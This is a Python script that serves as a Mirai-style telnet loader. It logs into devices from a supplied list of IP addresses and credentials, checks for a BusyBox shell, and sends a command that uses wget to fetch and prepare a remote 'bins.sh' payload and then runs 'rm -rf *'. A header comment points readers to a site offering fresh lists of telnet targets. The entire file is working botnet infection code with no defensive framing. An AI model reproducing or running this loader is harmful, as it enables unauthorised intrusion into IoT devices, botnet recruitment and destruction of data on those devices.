#!/usr/bin/python
# Telnet loader | have fun Yo! This Loads Mostly BuZy BoXeS regulr format/Mirai.
# You Can Find Fresh TELNET List To Load @ http://godz56.tk/telnet-list/
# Simple Telnet Loader Ya d1g?

import sys, re, os, socket, time
from multiprocessing import Process

if len(sys.argv) < 2:
	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")

cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/bins.sh; chmod 777 bins.sh; rm -rf *" #command to send
info = open(str(sys.argv[1]),'a+')

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')


def infect(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(10)
		tn.connect((ip,23))
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "ogin")
		if "ogin" in hoho:
			tn.send(username + "\n")
			time.sleep(0.09)
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "assword:")
		if "assword" in hoho:
			tn.send(password + "\n")
			time.sleep(0.8)
		else:
			pass
	except Exception:
		tn.close()
	try:
		prompt = ''
		prompt += tn.recv(40960)
		if ">" in prompt and "ONT" not in prompt:
			try:
				success = False
				tn.send("cat | sh" + "\n")
				time.sleep(0.1)
				timeout = 8
				data = ["BusyBox", "Built-in"]
				tn.send("sh" + "\n")
				time.sleep(0.01)
				tn.send("busybox" + "\r\n")
				buf = ''
				start_time = time.time()
				while time.time() - start_time < timeout:
					buf += tn.recv(40960)
					time.sleep(0.01)
					for info in data:
						if info in buf and "unrecognized" not in buf:
							success = True
							break
			except:
				pass
		elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
			try:
				success = False
				timeout = 8
				data = ["BusyBox", "Built-in"]
				tn.send("sh" + "\n")
				time.sleep(0.01)
				tn.send("shell" + "\n")
				time.sleep(0.01)
				tn.send("help" + "\n")
				time.sleep(0.01)
				tn.send("busybox" + "\r\n")
				buf = ''
				start_time = time.time()
				while time.time() - start_time < timeout:
					buf += tn.recv(40960)
					time.sleep(0.01)
					for info in data:
						if info in buf and "unrecognized" not in buf:
							success = True
							break
			except:
				pass
		else:
			tn.close()
		if success == True:
			try:
				tn.send(cmd + "\n")
				print "\033[32m[\033[31m+\033[32m] \033[33mCommand Sent!\033[32m %s"%(ip)
				time.sleep(20)
				tn.close()
			except:
				tn.close()
		tn.close()
	except Exception:
		tn.close()
 
for x in info:
	try:
		if ":23 " in x:
			x = x.replace(":23 ", ":")
		xinfo = x.split(":")
		session = Process(target=infect, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass
session.join()